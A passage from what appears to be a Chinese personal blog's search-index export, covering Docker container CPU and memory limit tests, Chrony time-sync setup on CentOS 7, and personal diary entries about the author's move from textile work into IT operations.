--hdd-bytes 3G 对两个容器同时进行 CPU压测，在宿主机中查看两个容器CPU占用情况123[root@ok188 ~]# docker stats 2_cpuCONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O 2_cpu 33.31% 24.34MiB / 1.932GiB 1.23% 18.2MB / 322kB 49.1MB / 27.7MB 123[root@ok188 ~]# docker stats 4_cpuCONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O 4_cpu 65.96% 38.82MiB / 1.932GiB 1.96% 18.3MB / 451kB 8.19kB / 27.7MB 观察以上结果发现容器名为4_cpu权重比2_cpu大2倍，所以4_cpu可使用的cpu更多。停止压测名为4_cpu的容器, 在宿主机中查看两个容器CPU占用情况123[root@ok188 ~]# docker stats 2_cpuCONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O 2_cpu 99.50% 24.34MiB / 1.932GiB 1.23% 18.2MB / 322kB 49.1MB / 27.7MB 123[root@ok188 ~]# docker stats 4_cpuCONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O 4_cpu 0.00% 37.5MiB / 1.932GiB 1.90% 18.3MB / 452kB 8.19kB / 27.7MB 结论参数cpu-shares 只是设置cpu使用权重，只会在 CPU 密集(繁忙)型运行进程时体现出来。当一个 container 空闲时，其它容器都是可以占用 CPU 的。备注：物理主机为多核的情况下，显示的cpu使用比例有差异，本人测试主机为单核。 1.2、通过 –cpu-period &amp; –cpu-quota 限制容器的 CPU 使用上限默认的 CPU CFS「Completely Fair Scheduler」period 是 100ms。我们可以通过 –cpu-period 值限制容器的 CPU 使用。一般 –cpu-period 配合 –cpu-quota 一起使用。 为啥把这两个参数放一起呢？因为这两个参数是相互配合的，–cpu-period和–cpu-quota的这种配置叫Ceiling Enforcement Tunable Parameters，–cpu-shares的这种配置叫Relative Shares Tunable Parameters。–cpu-period是用来指定容器对CPU的使用要在多长时间内做一次重新分配，而–cpu-quota是用来指定在这个周期内，最多可以有多少时间用来跑这个容器。跟–cpu-shares不同的是这种配置是指定一个绝对值，而且没有弹性在里面，容器对CPU资源的使用绝对不会超过配置的值。 设置 cpu-period 为 100000，cpu-quota 为 50000，表示最多可以使用 cpu到50%。1[root@nsj-13-58 ~]# docker run -it --cpu-period=100000 --cpu-quota=50000 --name 0.5_p_cpu centos:7 /bin/bash 压测容器，并查看CPU占用情况：123[root@ok188 ~]# docker stats 0.5_p_cpuCONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O0.5_p_cpu 50.33% 22.12MiB / 1.932GiB 1.12% 18.3MB / 348kB 524kB / 27.7MB 通过以上测试可以得知，–cpu-period 结合 –cpu-quota 配置是固定的，无论宿主机系统 CPU 是闲还是繁忙，如上配置，容器最多只能使用 CPU 到 50%。 二、Docker容器Memory资源限制测试默认启动一个container，对于容器的内存是没有任何限制的。 2.1、默认启动一个 container，对于容器的内存是没有任何限制的。12345678[root@ok188 ~]# docker run -it -d --name no_limit_memory centos:7 /bin/bash[root@ok188 ~]# docker stats no_limit_memoryCONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/Ono_limit_memory 0.00% 932KiB / 1.932GiB 0.05% 586B / 0B 8.19kB / 0B [root@ok188 ~]# free -g total used free shared buff/cache availableMem: 1 0 0 0 1 1Swap: 1 0 1 MEM LIMIT显示的是容器宿主机的内存大小，Mem+Swap的总大小 2.2、通过 -m 参数限制内存大小设置-m值为500Mb，表示容器程序使用内存受限。按照官方文档的理解，如果指定 -m 内存限制时不添加 –memory-swap 选项，则表示容器中程序可以使用 500m内存和500m swap 内存。那么容器里程序可以跑到500m*2=1g后才会被oom给杀死。 12345[root@ok188 ~]# docker run -it -d -m 500m --name limit_memory_1 centos:7 /bin/bash 21eb95cffa45972603cb0e67b7ee0724d019cd7182fa5668bf07665ddf4f83cc[root@ok188 ~]# docker stats limit_memory_1CONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/Olimit_memory_1 0.00% 916KiB / 500MiB 0.09% 586B / 0B 0B / 0B 在libcontainer源码里1memory.memsw.limit_in_bytes 值是被设置成我们指定的内存参数的两倍。 其中代码如下：123456// By default, MemorySwap is set to twice the size of RAM.// If you want to omit MemorySwap, set it to `-1'.if d.c.MemorySwap != -1 &#123;if err := writeFile(dir, "memory.memsw.limit_in_bytes", strconv.FormatInt(d.c.Memory*2, 10)); err != nil &#123;return err&#125; 使用压测工具进行压测，当压测值是 memory + swap之和上限时，则容器中的进程会被直接 OOM kill。 2.3参数–memory-swappiness=0 表示禁用容器 swap 功能。1[root@ok188 ~]# docker run -it -d -m 500m --memory-swappiness=0 --name limit_memory_noswap_1 centos:7 /bin/bash 使用压测工具进行压测，当压测值是 1G ，则容器中的进程会被直接 OOM kill。查看容器内系统日志： 2.4指定限制内存大小并且设置 memory-swap 值为 -1表示容器程序使用内存受限，而 swap 空间使用不受限制（宿主 swap 支持使用多少则容器即可使用多少。如果 –memory-swap 设置小于 –memory 则设置不生效，使用默认设置）。–memory-swap -11[root@ok188 ~]# docker run -it -d -m 500m --memory-swap -1 --name limit_memory_2 centos:7 /bin/bash 2.5指定限制内存大小并且设置 memory-swap 值指定限制内存大小500Mb并且设置 memory-swap 值400Mb当压测值是900Mb时，则容器中的进程会被直接 OOM kill。1[root@ok188 ~]# docker run -it -d -m 500m --memory-swap 400m --name limit_memory_3 centos:7 /bin/bash 备注：实际生产环境不推荐使用swap功能，建议直接禁用swap功能。 2.6 参数–oom-kill-disable ，加上之后则达到限制内存之后也不会被 kill正常情况不添加 –oom-kill-disable 容器程序内存使用超过限制后则会直接 OOM kill，加上之后则达到限制内存之后也不会被 kill。1[root@ok188 ~]# docker run -it -d -m 500m --oom-kill-disable --name limit_memory_4 centos:7 /bin/bash ==注意如果是以下的这种没有对容器作任何资源限制的情况，添加 –oom-kill-disable 选项就比较危险了：== 1[root@ok188 ~]# docker run -it -d --oom-kill-disable --name limit_memory_5 centos:7 /bin/bash 因为此时容器内存没有限制，使用的上限值是物理内存的上限值。 并且不会被 oom kill，此时系统则会 kill 系统进程用于释放内存。 后记：目前 Docker 支持的资源限制选项 Option Description -m, –memory=”” Memory limit (format: []). Number is a positive integer. Unit can be one of b, k, m, or g. Minimum is 4M. –memory-swap=”” Total memory limit (memory + swap, format: []). Number is a positive integer. Unit can be one of b, k, m, or g. –memory-reservation=”” Memory soft limit (format: []). Number is a positive integer. Unit can be one of b, k, m, or g. –kernel-memory=”” Kernel memory limit (format: []). Number is a positive integer. Unit can be one of b, k, m, or g. Minimum is 4M. -c, –cpu-shares=0 CPU shares (relative weight) –cpu-period=0 Limit the CPU CFS (Completely Fair Scheduler) period –cpuset-cpus=”” CPUs in which to allow execution (0-3, 0,1) –cpuset-mems=”” Memory nodes (MEMs) in which to allow execution (0-3, 0,1). Only effective on NUMA systems. –cpu-quota=0 Limit the CPU CFS (Completely Fair Scheduler) quota –blkio-weight=0 Block IO weight (relative weight) accepts a weight value between 10 and 1000. –blkio-weight-device=”” Block IO weight (relative device weight, format: DEVICE_NAME:WEIGHT) –device-read-bps=”” Limit read rate from a device (format: :[]). Number is a positive integer. Unit can be one of kb, mb, or gb. –device-write-bps=”” Limit write rate to a device (format: :[]). Number is a positive integer. Unit can be one of kb, mb, or gb. –device-read-iops=”” Limit read rate (IO per second) from a device (format: :). Number is a positive integer. –device-write-iops=”” Limit write rate (IO per second) to a device (format: :). Number is a positive integer. –oom-kill-disable=false Whether to disable OOM Killer for the container or not. –memory-swappiness=”” Tune a container’s memory swappiness behavior. Accepts an integer between 0 and 100. –shm-size=”” Size of /dev/shm. The format is . number must be greater than 0. Unit is optional and can be b (bytes), k (kilobytes), m (megabytes), or g (gigabytes). If you omit the unit, the system uses bytes. If you omit the size entirely, the system uses 64m. 附Docker容器限制源码路径：github.com/opencontainers/runc/libcontainer/cgroups/fs]]></content>
      <categories>
        <category>系统运维</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker_Container_Limit</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux系统下校时服务Chrony使用]]></title>
    <url>%2Flinux_ops%2Flinux_Chrony%2F</url>
    <content type="text"><![CDATA[Linux系统下校时服务Chrony使用Chrony 应用本身已经有几年了，其是是网络时间协议的 (NTP) 的另一种实现。一直以来众多发行版里标配的都是ntpd对时服务，自rhel7/centos7 起，Chrony做为了发行版里的标配服务，不过老的ntpd服务依旧在rhel7/centos7里可以找到 。Chrony可以同时做为ntp服务的客户端和服务端。默认安装完后有两个程序chronyd和chronyc 。chronyd是一个在系统后台运行的守护进程，chronyc是用来监控chronyd性能和配置其参数程序 安装和启用1234567891011121314151617181920212223242526[root@ok188.net ~]# yum install -y chrony[root@ok188.net ~]# cat &lt;&lt; EOF &gt; /etc/chrony.conf# 使用上层的internet ntp服务器server time1.aliyun.com iburstserver time2.aliyun.com iburstserver time3.aliyun.com iburstserver time4.aliyun.com iburstserver time5.aliyun.com iburststratumweight 0driftfile /var/lib/chrony/driftrtcsyncmakestep 10 3bindcmdaddress 127.0.0.1bindcmdaddress ::1keyfile /etc/chrony.keyscommandkey 1generatecommandkeynoclientloglogchange 0.5logdir /var/log/chronyEOF[root@ok188.net ~]# systemctl stop ntpd[root@ok188.net ~]# systemctl disable ntpd[root@ok188.net ~]# systemctl enable chronyd.service[root@ok188.net ~]# systemctl start chronyd.service 配置文件解析如果本局域网内有对时服务开启的话，通过将上面的几条serer记录删除，增加指定局域网内的对时服务器并restart chrony服务即可。其中主要的配置参数有如下几个： server - 该参数可以多次用于添加时钟服务器，必须以”server “格式使用。一般而言，你想添加多少服务器，就可以添加多少服务器； stratumweight - stratumweight指令设置当chronyd从可用源中选择同步源时，每个层应该添加多少距离到同步距离。默认情况下，CentOS中设置为0，让chronyd在选择源时忽略源的层级； driftfile - chronyd程序的主要行为之一，就是根据实际时间计算出计算机增减时间的比率，将它记录到一个文件中是最合理的，它会在重启后为系统时钟作出补偿，甚至可能的话，会从时钟服务器获得较好的估值； rtcsync - rtcsync指令将启用一个内核模式，在该模式中，系统时间每11分钟会拷贝到实时时钟（RTC）； allow / deny - 这里你可以指定一台主机、子网，或者网络以允许或拒绝NTP连接到扮演时钟服务器的机器； cmdallow / cmddeny - 跟上面相类似，只是你可以指定哪个IP地址或哪台主机可以通过chronyd使用控制命令； bindcmdaddress - 该指令允许你限制chronyd监听哪个网络接口的命令包（由chronyc执行）。该指令通过cmddeny机制提供了一个除上述限制以外可用的额外的访问控制等级。 makestep - 通常，chronyd将根据需求通过减慢或加速时钟，使得系统逐步纠正所有时间偏差。在某些特定情况下，系统时钟可能会漂移过快，导致该调整过程消耗很长的时间来纠正系统时钟。该指令强制chronyd在调整期大于某个阀值时步进调整系统时钟，但只有在因为chronyd启动时间超过指定限制（可使用负值来禁用限制），没有更多时钟更新时才生效。 查看同步状态检查ntp源服务器状态：1234567[root@ok188.net ~]# chronyc sourcestats210 Number of sources = 4Name/IP Address NP NR Span Frequency Freq Skew Offset Std Dev==============================================================================time6.aliyun.com 14 10 81m -0.017 0.182 +1290us 261ustime4.aliyun.com 11 5 77m -0.122 0.825 +513us 1029ustime5.aliyun.com 12 7 73m +0.052 0.262 -1194us 275us 检查ntp详细同步状态：12345678910111213141516[root@ok188.net ~]# chronyc sources -v210 Number of sources = 4 .-- Source mode '^' = server, '=' = peer, '#' = local clock. / .- Source state '*' = current synced, '+' = combined , '-' = not combined,| / '?' = unreachable, 'x' = time may be in error, '~' = time too variable.|| .- xxxx [ yyyy ] +/- zzzz|| Reachability register (octal) -. | xxxx = adjusted offset,|| Log2(Polling interval) --. | | yyyy = measured offset,|| \ | | zzzz = estimated error.|| | | \MS Name/IP address Stratum Poll Reach LastRx Last sample===============================================================================^+ time6.aliyun.com 2 10 377 1021 +1438us[+1345us] +/- 25ms^+ time4.aliyun.com 2 9 377 2 +2047us[+2047us] +/- 35ms^* time5.aliyun.com 2 9 377 506 -1712us[-1851us] +/- 18ms 使用chronyc可以通过运行chronyc命令来修改设置，命令如下： accheck - 检查NTP访问是否对特定主机可用 activity - 该命令会显示有多少NTP源在线/离线 add server - 手动添加一台新的NTP服务器。 clients - 在客户端报告已访问到服务器 delete - 手动移除NTP服务器或对等服务器 settime - 手动设置守护进程时间 tracking - 显示系统时间信息 输入help命令可以查看更多chronyc的交互命令。1234567891011121314[root@ok188.net ~]# chronycchrony version 2.1.1Copyright (C) 1997-2003, 2007, 2009-2015 Richard P. Curnow and otherschrony comes with ABSOLUTELY NO WARRANTY. This is free software, andyou are welcome to redistribute it under certain conditions. See theGNU General Public License version 2 for details.chronyc&gt; activity200 OK4 sources online0 sources offline0 sources doing burst (return to online)0 sources doing burst (return to offline)1 sources with unknown address chrony的优势Chrony 的优势包括： 更快的同步只需要数分钟而非数小时时间，从而最大程度减少了时间和频率误差，这对于并非全天 24 小时运行的台式计算机或系统而言非常有用。 能够更好地响应时钟频率的快速变化，这对于具备不稳定时钟的虚拟机或导致时钟频率发生变化的节能技术而言非常有用。 在初始同步后，它不会停止时钟，以防对需要系统时间保持单调的应用程序造成影响。 在应对临时非对称延迟时（例如，在大规模下载造成链接饱和时）提供了更好的稳定性。 无需对服务器进行定期轮询，因此具备间歇性网络连接的系统仍然可以快速同步时钟。 官方文档https://chrony.tuxfamily.org/documentation.html]]></content>
      <categories>
        <category>系统运维</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Chrony</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[毕业这4年-坦然接受，脚踏实地]]></title>
    <url>%2Flife%2Flife_record_2014-9-4%2F</url>
    <content type="text"><![CDATA[毕业4年了，和朋友聊聊天发现原来每个人都过的很难。但没有认怂和想放弃的，依旧在努力。但少了初出校园时的迷茫，生活逼迫我们去找一个方向一个出路。毕业这4年我们有了不同的经历，谈不上人生有多大的起伏，但也共同经历了迷茫与困惑，有过恐惧与逃避。一个人在年轻时经历磨难，如能正确视之，冲出黑暗，那就是一个值得敬慕的人。 毕业4年了，我是读了两年书又干了两年活这期间大多一个人在生活，孤独到快与世隔绝了，一切都得靠自己慢慢的领悟，慢慢的从各种不顺中思考与成长。其间很多事情想通了，很多事情又想不通了，但还是就这么过来了。 奋斗的青春2010年毕业来到苏州后又读了两年书，美美的想着以后可以坐电脑面前吃着泡面玩游戏还可以拿工资。后来2012年毕业正式开始工作，通宵的工作时间，深夜了一个人的办公室，一个人的宿舍，孤单到自言自语，但可以坐电脑面前吃泡面也是游戏公司。2012年开始学习linux，2013年复学linux；2014年我依然在学习。从我学习经历来看，虽然我笨了点慢了点，但总算完成了技术的初步积累。 毕业4年了，在苏州呆了4年我不爱苏州，也许会随时离去，但也许会一直坚持。 始终未曾离去，只因那遥远的梦在这里似乎看到了可能。 毕业4年了，2014年找到了女朋友2014年我遇到了你，有了你。从此我心里感受不到是自己一个人在生活，处处想到的是我们。真实的你，给了我最大的感动和支持。多少个日子，我在心底真真的读着你，心牵着你。讲不出多浪漫的词语，谢谢有你！让我慢慢读懂了什么是责任和珍惜。 毕业4年了，梦想与行动我们感受到压力是因为我们不认同现在的自己，不甘心。对自己现在的不认同，是前行的开始。我们永远无法准备好，因为我们很无知。我们无法知道明天会发生什么，事情是变的更糟糕还是变的更好。我们可以计划去开始做一件事，猜想最终的结果，但那毕竟只是猜想。有时你得要承认自己的无力，有时要庆幸自己的幸运。最好的准备便是没有准备，坦然接受、脚踏实地。现在，我可以坦然接受自己不是一个优秀的人，但是我不认同以后依旧如此。]]></content>
      <categories>
        <category>生活记录</category>
        <category>2014年</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[毕业这4年-坦然接受，脚踏实地]]></title>
    <url>%2F%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95%2F2014%E5%B9%B4%2Flife_record_2014-9-4%2F</url>
    <content type="text"><![CDATA[毕业4年了，和朋友聊聊天发现原来每个人都过的很难。但没有认怂和想放弃的，依旧在努力。但少了初出校园时的迷茫，生活逼迫我们去找一个方向一个出路。毕业这4年我们有了不同的经历，谈不上人生有多大的起伏，但也共同经历了迷茫与困惑，有过恐惧与逃避。一个人在年轻时经历磨难，如能正确视之，冲出黑暗，那就是一个值得敬慕的人。 毕业4年了，我是读了两年书又干了两年活这期间大多一个人在生活，孤独到快与世隔绝了，一切都得靠自己慢慢的领悟，慢慢的从各种不顺中思考与成长。其间很多事情想通了，很多事情又想不通了，但还是就这么过来了。 奋斗的青春2010年毕业来到苏州后又读了两年书，美美的想着以后可以坐电脑面前吃着泡面玩游戏还可以拿工资。后来2012年毕业正式开始工作，通宵的工作时间，深夜了一个人的办公室，一个人的宿舍，孤单到自言自语，但可以坐电脑面前吃泡面也是游戏公司。2012年开始学习linux，2013年复学linux；2014年我依然在学习。从我学习经历来看，虽然我笨了点慢了点，但总算完成了技术的初步积累。 毕业4年了，在苏州呆了4年我不爱苏州，也许会随时离去，但也许会一直坚持。 始终未曾离去，只因那遥远的梦在这里似乎看到了可能。 毕业4年了，2014年找到了女朋友2014年我遇到了你，有了你。从此我心里感受不到是自己一个人在生活，处处想到的是我们。真实的你，给了我最大的感动和支持。多少个日子，我在心底真真的读着你，心牵着你。讲不出多浪漫的词语，谢谢有你！让我慢慢读懂了什么是责任和珍惜。 毕业4年了，梦想与行动我们感受到压力是因为我们不认同现在的自己，不甘心。对自己现在的不认同，是前行的开始。我们永远无法准备好，因为我们很无知。我们无法知道明天会发生什么，事情是变的更糟糕还是变的更好。我们可以计划去开始做一件事，猜想最终的结果，但那毕竟只是猜想。有时你得要承认自己的无力，有时要庆幸自己的幸运。最好的准备便是没有准备，坦然接受、脚踏实地。现在，我可以坦然接受自己不是一个优秀的人，但是我不认同以后依旧如此。]]></content>
      <categories>
        <category>生活记录</category>
        <category>2014年</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2012年一些日记记录归档]]></title>
    <url>%2F%E7%94%9F%E6%B4%BB%E8%AE%B0%E5%BD%95%2F2012%E5%B9%B4%2Flife_record_2012%2F</url>
    <content type="text"><![CDATA[前言无意中翻看到了2012年，本科临近毕业时的那段时间相关记录，很有意思。2012年那一年注定是个特殊的年份。现在回想起来发现人生所有经历都是一种财富！ 再次归档整理时间：2018年4月30日 2012-3-19 22:31未来会好的？我好想现在就能看到未来的样子专科时开始接触电脑，并慢慢喜欢上电脑了。在帮朋友解决电脑的问题时体验到了少有的成就和自豪。但在专科时学的专业是纺织机电，2010年浑浑噩噩的专科的大学生活就这么结束了。毕业后在一家纺织厂工作，工作后才发现这种生活真心不是自己喜欢和想要的。当时想从事计算机方面的工作，可在寻找工作时发现自己会的只是一些电脑操作的技巧和一张计算机等级二级vb证书，当时想过培训，又怕培训不靠谱。于是参加了一所大学的自考助学（脱产的那种）学习。在自考的同时考取了ccna，今年5月份打算参加软考（网络工程师）。今年7月份所有自考课程就结束了，又要开始重新找工作了。方向定在网络方面。现突然发现自己对电脑的热情不如之前那么浓烈了，归于平淡。考虑更多的是工作和以后的生活还有的是从事计算机那个方向更挣钱。小时有个玩伴初中毕业后在亲戚的带领下去了一家移动电信公司工作，进行室外布线和线路维护。过年回家时听他讲过他的工作但没见过，但人胖了好多，他现在也是我们村在外面打工混的比较好的一个，我叔叔家有个弟弟今年初中毕业后没工作今年也和他去了，看样子工作技术难度或者要求不是太高。我问过弟弟，他说工作时间不固定更多的是电信线路的抢修维护。但他们工资都挺高的，没面试直接上岗一个月也5千左右。对，眼光得放远了看，试着用一些大道理一遍一遍的稳住自己：坚持就是顺利、学历不重要能力更重要、奋斗终会成功的、不浮躁、从基层做起一步一步来。。。。。。。。可有时夜晚还是会经常的习惯性失眠。 2012-4-27 22:30面试归来，一塌糊涂今天去面试了，面试职位是网络监控。由于紧张回答问题时语无伦次，表现的好差。很多东西都可以回答出来的看由于当时紧张全忘了。估计这次没戏了。再多的面试技巧，没有扎实的技术基础也是没用的。第一轮面试时问的全是技术问题，到第二轮才问一些职业规划类的问题。 以前我总是抱怨学校学的知识不实用全理论，指望着到社会上找一家好的公司实习积累点实际经验，抱着以学习的态度寻找公司。可我也同时忘了公司不再是学校，公司需要你为她创造价值，需要你为她做事，而不是需要一个学生来学习参观。 2012-5-13 20:09一个纺织工人的IT之路本人2007年上专科时才开始接触电脑，专科时学的是纺织一类的专业。2008年有了自己的第一台笔记本电脑，开始学着自己装操作系统，学着拆装电脑除尘，帮同学解决电脑问题，遇到的一些电脑问题有时我也不会，但我喜欢去百度、google搜索。慢慢的成了班上同学眼中的电脑高手。2010专科毕业后进入一家纺织厂工作过，修理纺织机器，环境很差，第一个月工资1k，两班制12小时，没有星期天，当时内心深处羡慕着那些搞IT的人至少工作环境不会那么差。 开始思考自己的人生，不想就这样下去。无意中在网上看到了马云、李开复、俞敏洪、史玉柱等一些大佬们的故事和演讲视频。被深深触动。后决心辞职 要做自己喜欢的工作。2010年9月份参加了一所大学的脱产自考助学软件工程的学习，才发现IT有好多方向。期间参加学校CCNA培训，并于2011年10月份通过认证考试。现正在准备软考，一、为了以考促学，二、想通过多考几个证增加就业机会。想过搞开发，可发现自己根本没有什么项目经验，直至现在自己只修改过一些代码，自己根本没有敲打编写出过一款软件出来。于是想专攻网络方向，习惯了逛51cto论坛开始寻找资料，习惯了每天泡图书馆。但同时在论坛中也看到了太多的前辈们对自己的工作以及待遇的抱怨，自己也时不时的在怀疑，在迷茫。今年5月1号以前的专科同学相聚，专科时的那些同学现大多还是在从事着纺织机修的工作，不过工资也从一开始的1k涨到了3.5k。他们聊的依然是自己的工作环境如何差，工资低，同时表示如何如何羡慕着我的以后工作。才发现这个社会每个人都在抱怨着，想改变。过着被别人羡慕的生活，却同时羡慕着别人过的生活。有时与其抱怨不如实际行动，改变自己更容易些。 2012-9-16 01:40乱七八糟、随便写写工作了你才能真正的去发现需要学习什么样的技能。目标定位网络系统运维。学网络首先得学TCP/IP网络协议，TCP/IP协议是在Unix上开发出来的，所以想学好网络就得学好Linux，想学好Linux最少的得会用shell、perl等编写脚本吧，会写脚本C是基础啊。计算机端口得清楚吧、常见的网络攻击方式、一些黑客工具得清楚吧。云计算、虚拟化得有所了解吧，想做好运维工作，数据结构得了解、SQL语句得熟练运用吧，CDN得懂吧。常见监控软件Nagios、Cacti、Zabbix等得会用吧，网络数据抓包、网络协议分析sniffer得会吧。好多路由交换协议都是思科搞出来的，努力准备去考个CCIE。英语是一切基础的基础啊。。。。。。。。。该行动了，不能停留在原地徘徊，资料教程是下载了不少，却没有以前的那么心定认真看完过。年龄也大了，却还单着，害怕一个人以后永远一个人。与电脑呆久了发现电脑更亲切人更陌生了。有时担心未来能否过上自己现在想象中的生活？可现在的生活总得有现在的生活状态吧。锻炼身体。 2010-11-8 20:14灵魂与肉身我是谁？我为何会思考？如果我现死去我的灵魂是否还会以另一种方式存在！我是我吗？如何证明我是真实存在的！我周围的一切都是真的吗？说不定我现看到的和我感受到的只是某种生物虚幻给我的？也有可能我现活在别人或自己的梦中？ 肉身和灵魂是分开的吗？灵魂是独立于肉身存在的吗？ 如果我们相信肉体和灵魂是分开独立的，那好我们肉身死后灵魂呢？是否还会存在以另一种方式？或投胎重新做人或其他动物什么的？那假如你投胎成为了一头猪可你这时仍保留人的思维和意识。有这种可能性吗？好比把你的灵魂放进了猪的身体里或其他人的体内。因为肉身和灵魂是分开的吗！那么你的灵魂放还进去后还会具有本来那个肉身所具有的思维和意识吗？ 如果我们相信灵魂是独立于肉身存在的，那么我们可以认为灵魂在我们这个肉身没有出现之前就已经存在了？这种存在有可能性吗？如果有那这个灵魂以什么样的形式存在着呢？我现在的这个肉身是不是我的灵魂想象出来的呢？ 如果一个人意志同我一样，智力与我相同，那么我们便是同一个“我”吗？我们可以以各种规定性来定义自我，只是我想知道有怎样的规定性。我们照镜子，拍相片，不停地做心理测试，其实都是想以外在的角度来审视“我”是谁。“每个人都是一个宇宙”，我必须相信，以便可以维系自我的意义并生存下去。 如果把自我认为是物质的，那么身体不停变化，那么我也早已就不是我?如果把自我认为是连续的意识和感觉，那么当我们睡着觉以后，也就没有了意识没有了感觉，那当第二天到来，又一个新的连续的意识和感觉就又出现了，我也已经就不是我了?]]></content>
      <categories>
        <category>生活记录</category>
        <category>2012年</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
</search>
